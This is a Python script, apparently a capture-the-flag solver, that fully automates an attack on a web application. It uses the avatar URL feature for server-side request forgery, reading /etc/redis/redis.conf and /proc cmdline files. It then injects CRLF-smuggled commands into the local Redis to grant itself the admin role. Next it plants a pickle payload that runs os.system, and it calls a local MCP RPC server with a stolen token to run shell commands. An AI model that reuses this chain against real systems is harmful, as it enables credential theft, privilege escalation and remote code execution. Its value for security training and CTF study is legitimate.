#!/usr/bin/env python3
import argparse
import base64
import random
import re
import string
import sys
from dataclasses import dataclass
from typing import List, Optional, Tuple

import requests


UPLOAD_TYPE_FROM_URL = "\u4eceURL\u4e0b\u8f7d"
HTTP_TIMEOUT = 12


class ExploitError(Exception):
    pass


@dataclass
class GlobalRef:
    module: str
    name: str


@dataclass
class CallExpr:
    func: object
    args: List[object]


def _pickle_pystr(text: str) -> str:
    escaped = text.replace("\\", "\\\\").replace("'", "\\'")
    return f"'{escaped}'"


def _emit_pickle_expr(expr: object) -> str:
    if isinstance(expr, GlobalRef):
        return f"c{expr.module}\n{expr.name}\n"
    if isinstance(expr, str):
        return f"S{_pickle_pystr(expr)}\n"
    if isinstance(expr, CallExpr):
        return _emit_pickle_expr(expr.func) + "(" + "".join(_emit_pickle_expr(a) for a in expr.args) + "tR"
    raise TypeError(f"unsupported pickle expr type: {type(expr)!r}")


def build_pickle_rce_payload(shell_command: str) -> bytes:
    getattr_ref = GlobalRef("builtins", "getattr")
    online_user_ref = GlobalRef("__main__", "OnlineUser")

    step1 = CallExpr(getattr_ref, [online_user_ref, "__init__"])
    step2 = CallExpr(getattr_ref, [step1, "__globals__"])
    step3 = CallExpr(getattr_ref, [step2, "__getitem__"])
    step4 = CallExpr(step3, ["os"])
    step5 = CallExpr(getattr_ref, [step4, "system"])
    final = CallExpr(step5, [shell_command])

    payload = _emit_pickle_expr(final) + "."
    return payload.encode()


def escape_redis_inline(value: bytes) -> str:
    out: List[str] = []
    for b in value:
        c = chr(b)
        if c == "\\":
            out.append("\\\\")
        elif c == '"':
            out.append('\\"')
        elif c == "\n":
            out.append("\\n")
        elif c == "\r":
            out.append("\\r")
        elif 32 <= b <= 126:
            out.append(c)
        else:
            out.append(f"\\x{b:02x}")
    return "".join(out)


class AuthExploit:
    def __init__(self, base_url: str) -> None:
        if not base_url.startswith("http://") and not base_url.startswith("https://"):
            base_url = "http://" + base_url
        self.base_url = base_url.rstrip("/")
        self.session = requests.Session()
        self.session.trust_env = False
        self.username: Optional[str] = None
        self.password: Optional[str] = None

    def _url(self, path: str) -> str:
        return f"{self.base_url}{path}"

    def _request(self, method: str, path: str, **kwargs) -> requests.Response:
        if "timeout" not in kwargs:
            kwargs["timeout"] = HTTP_TIMEOUT
        resp = self.session.request(method=method, url=self._url(path), **kwargs)
        return resp

    @staticmethod
    def _extract_error_snippet(html: str) -> str:
        for marker in [
            "urlopen error",
            "HTTP Error",
            "Remote end closed connection without response",
            "-NOAUTH",
            "-ERR",
            "Permission denied",
            "No such file or directory",
        ]:
            idx = html.find(marker)
            if idx != -1:
                return html[idx : idx + 180]
        return html[:180].replace("\n", " ")

    @staticmethod
    def _extract_data_uri_bytes(html: str) -> Optional[bytes]:
        m = re.search(r'src="data:([^;]*);base64,([A-Za-z0-9+/=]*)"', html)
        if not m:
            return None
        b64 = m.group(2)
        if b64 == "":
            return b""
        return base64.b64decode(b64)

    def avatar_fetch(self, avatar_url: str) -> str:
        data = {"upload_type": UPLOAD_TYPE_FROM_URL, "avatar_url": avatar_url}
        resp = self._request("POST", "/profile/avatar", data=data)
        return resp.text

    def read_file_via_avatar(self, path: str) -> bytes:
        html = self.avatar_fetch("file://" + path)
        data = self._extract_data_uri_bytes(html)
        if data is None:
            raise ExploitError(f"read file failed: {path} :: {self._extract_error_snippet(html)}")
        return data

    def try_read_file_via_avatar(self, path: str) -> Optional[bytes]:
        try:
            return self.read_file_via_avatar(path)
        except ExploitError:
            return None

    def register_and_login(self) -> None:
        self.username = "u" + "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(8))
        self.password = "Aa123456!"

        reg_data = {
            "username": self.username,
            "password": self.password,
            "confirm_password": self.password,
            "name": "x",
            "age": "1",
            "phone": "1",
        }
        self._request("POST", "/register", data=reg_data)
        self.login(expect_admin=False)

    def login(self, expect_admin: bool) -> None:
        if not self.username or not self.password:
            raise ExploitError("username/password is not initialized")
        self._request("GET", "/logout")
        resp = self._request(
            "POST",
            "/login",
            data={"username": self.username, "password": self.password},
            allow_redirects=False,
        )
        if resp.status_code not in (302, 303):
            raise ExploitError(f"login failed, status={resp.status_code}, body={resp.text[:160]}")
        home = self._request("GET", "/home").text
        is_admin = ("/admin/users" in home) or ("角色: <span class=\"badge\">admin</span>" in home) or ("角色: admin" in home)
        if expect_admin and not is_admin:
            raise ExploitError("login succeeded but role is not admin")
        if not expect_admin and is_admin:
            # Not fatal: challenge state may be reused. Keep going.
            pass

    def get_redis_password(self) -> str:
        conf = self.read_file_via_avatar("/etc/redis/redis.conf").decode("utf-8", "ignore")
        m = re.search(r"(?m)^requirepass\s+(\S+)", conf)
        if not m:
            raise ExploitError("cannot parse redis password from /etc/redis/redis.conf")
        return m.group(1).strip()

    def find_mcp_script_path(self) -> str:
        for pid in range(1, 256):
            data = self.try_read_file_via_avatar(f"/proc/{pid}/cmdline")
            if not data:
                continue
            if b"mcp_server_secure" not in data:
                continue
            for part in data.split(b"\x00"):
                if b"mcp_server_secure" in part and part.endswith(b".py"):
                    return part.decode("utf-8", "ignore")
        raise ExploitError("cannot locate mcp_server_secure script path")

    @staticmethod
    def parse_mcp_info(script_text: str) -> Tuple[str, int]:
        token_m = re.search(r'auth_token\s*=\s*"([^"]+)"', script_text)
        if not token_m:
            raise ExploitError("cannot parse MCP auth token")
        token = token_m.group(1)

        # Prefer the constructor default, fallback to main() literal.
        port_m = re.search(r"def __init__\s*\(\s*self,\s*host='[^']*',\s*port=(\d+)\)", script_text)
        if not port_m:
            port_m = re.search(r"port=(\d+)\)", script_text)
        if not port_m:
            raise ExploitError("cannot parse MCP port")
        port = int(port_m.group(1))
        return token, port

    def redis_crlf(self, redis_commands: List[str]) -> str:
        payload = "http://127.0.0.1:6379/\r\n" + "\r\n".join(redis_commands) + "\r\nQUIT\r\n"
        return self.avatar_fetch(payload)

    def set_admin_role(self, redis_password: str) -> None:
        if not self.username:
            raise ExploitError("username is not initialized")
        self.redis_crlf(
            [
                f"AUTH {redis_password}",
                f"HSET user:{self.username} role admin",
            ]
        )

    def inject_pickle_online_user(self, redis_password: str, shell_command: str) -> None:
        if not self.username:
            raise ExploitError("username is not initialized")
        payload = build_pickle_rce_payload(shell_command)
        encoded = escape_redis_inline(payload)
        self.redis_crlf(
            [
                f"AUTH {redis_password}",
                f'SET online_user:{self.username} "{encoded}"',
                f"EXPIRE online_user:{self.username} 3600",
            ]
        )

    def trigger_unpickle(self) -> None:
        # Must keep current admin session; do not re-login here.
        self._request("GET", "/admin/online-users")

    def read_flag_file(self) -> str:
        data = self.read_file_via_avatar("/tmp/flag_root").decode("utf-8", "ignore")
        m = re.search(r"(?:flag|dart)\{[^}\r\n]+\}", data, flags=re.IGNORECASE)
        if not m:
            raise ExploitError(f"flag not found in /tmp/flag_root, content={data[:300]!r}")
        return m.group(0)

    def run(self) -> str:
        self.register_and_login()

        redis_password = self.get_redis_password()
        mcp_script_path = self.find_mcp_script_path()
        mcp_script = self.read_file_via_avatar(mcp_script_path).decode("utf-8", "ignore")
        mcp_token, mcp_port = self.parse_mcp_info(mcp_script)

        self.set_admin_role(redis_password)
        self.login(expect_admin=True)

        python_stmt = (
            "import xmlrpc.client,sys;"
            f"s=xmlrpc.client.ServerProxy('http://127.0.0.1:{mcp_port}/RPC2');"
            f"r=s.execute_command('{mcp_token}','cat /flag');"
            "sys.stdout.write((r.get('stdout') or '') + (r.get('stderr') or ''))"
        )
        shell_cmd = f'python -c "{python_stmt}" >/tmp/flag_root'

        self.inject_pickle_online_user(redis_password, shell_cmd)
        self.trigger_unpickle()
        return self.read_flag_file()


def main() -> int:
    parser = argparse.ArgumentParser(description="Solve auth challenge automatically.")
    parser.add_argument("--url", required=True, help="Target base URL, e.g. http://example.com")
    args = parser.parse_args()

    try:
        solver = AuthExploit(args.url)
        flag = solver.run()
        print(flag)
        return 0
    except Exception as exc:
        print(f"[!] {exc}")
        return 1


if __name__ == "__main__":
    sys.exit(main())
